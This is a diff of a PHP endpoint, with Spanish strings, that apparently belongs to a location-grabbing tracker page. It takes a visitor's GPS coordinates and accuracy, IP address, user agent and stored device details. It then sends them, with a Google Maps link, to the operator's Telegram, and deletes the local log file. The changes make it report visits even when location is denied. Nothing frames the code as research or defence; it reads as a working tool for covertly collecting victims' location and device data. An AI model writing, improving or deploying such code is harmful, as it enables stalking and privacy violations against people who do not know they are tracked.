@@ -1,4 +1,4 @@
-<?php 
+<?php
 require_once __DIR__ . '/config.php';
 require_once __DIR__ . '/ip_utils.php';
 require_once __DIR__ . '/telegram.php';
@@ -6,56 +6,41 @@ require_once __DIR__ . '/telegram.php';
 header('Content-Type: application/json');
 
 $raw = file_get_contents('php://input');
-$payload = json_decode($raw, true);
-
-if (!is_array($payload)) {
-    http_response_code(400);
-    echo json_encode(['status'=>'bad_request']);
-    exit;
-}
+$payload = json_decode($raw, true) ?: [];
 
 $lat = $payload['latitude'] ?? null;
 $lon = $payload['longitude'] ?? null;
 $acc = $payload['accuracy'] ?? null;
-$device = $payload['device'] ?? [];
+$error = $payload['error'] ?? null;
 
 $ip = get_client_ip();
 $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
-$ts = gmdate('c');
+$ts = gmdate('Y-m-d H:i:s');
 
-// --- Construir mensaje principal ---
-$msg = "📍 <b>Nueva ubicación</b>\n";
+$msg = "📍 <b>Nueva visita</b>\n";
+$msg .= "🌐 IP: $ip\n";
+$msg .= "🖥️ UA: $ua\n";
 
-if (!empty($ip)) $msg .= "🌐 IP: $ip\n";
-if (!empty($lat)) $msg .= "📌 Lat: $lat\n";
-if (!empty($lon)) $msg .= "📌 Lon: $lon\n";
-if (!empty($acc)) $msg .= "🎯 Precisión: {$acc}m\n";
-if (!empty($ua)) $msg .= "🖥️ UA: $ua\n";
-
-$msg .= "\n <b>- Informacion del dispositivo -</b>\n";
-
-// --- Leer datos guardados del archivo resultados.txt ---
-$file = __DIR__ . "/resultados.txt";
-if (file_exists($file)) {
-    $extra_info = file_get_contents($file);
-    if (!empty($extra_info)) {
-        $msg .= trim($extra_info) . "\n"; //enviar
-    }
+if ($lat && $lon) {
+    $msg .= "📌 Lat: $lat\n";
+    $msg .= "📌 Lon: $lon\n";
+    if ($acc) $msg .= "🎯 Precisión: {$acc}m\n";
+    $msg .= "🌍 Maps: https://www.google.com/maps?q=$lat,$lon\n";
+} else {
+    $msg .= "⚠️ Ubicación: " . ($error ?: "No disponible o denegada") . "\n";
 }
 
 $msg .= "⏰ Hora: $ts\n";
 
-if (!empty($lat) && !empty($lon)) {
-    $msg .= "🌍 Google Maps: https://www.google.com/maps?q={$lat},{$lon}\n";
+// Incluir info del dispositivo
+if (file_exists(__DIR__ . '/resultados.txt')) {
+    $extra = trim(file_get_contents(__DIR__ . '/resultados.txt'));
+    if ($extra) $msg .= "\n<b>Dispositivo:</b>\n$extra";
+    unlink(__DIR__ . '/resultados.txt');
 }
 
-// --- Enviar a Telegram ---
+// ENVIAR A TELEGRAM
 send_to_telegram($msg);
 
-$file = __DIR__ . "/resultados.txt";
-if (file_exists($file)) {
-    unlink($file);
-}
-
-echo json_encode(['status' => 'logged', 'timestamp' => $ts]);
+echo json_encode(['status' => 'ok']);
 ?>
